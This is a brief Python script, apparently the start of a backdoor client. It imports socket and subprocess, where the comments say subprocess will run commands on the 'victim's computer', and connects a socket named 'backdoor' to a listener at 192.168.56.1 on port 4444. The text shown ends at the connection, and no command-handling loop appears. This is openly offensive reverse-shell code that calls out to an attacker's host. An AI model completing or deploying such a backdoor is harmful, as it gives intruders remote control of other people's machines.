import socket # import socket module
import subprocess # import subprocess module ; used to run commands on victim's computer 


server_ip = '192.168.56.1' # define IP of server
port = 4444 # define port of server
backdoor = socket.socket() # create backdoor
backdoor.connect((server_ip, port)) # connect backdoor to server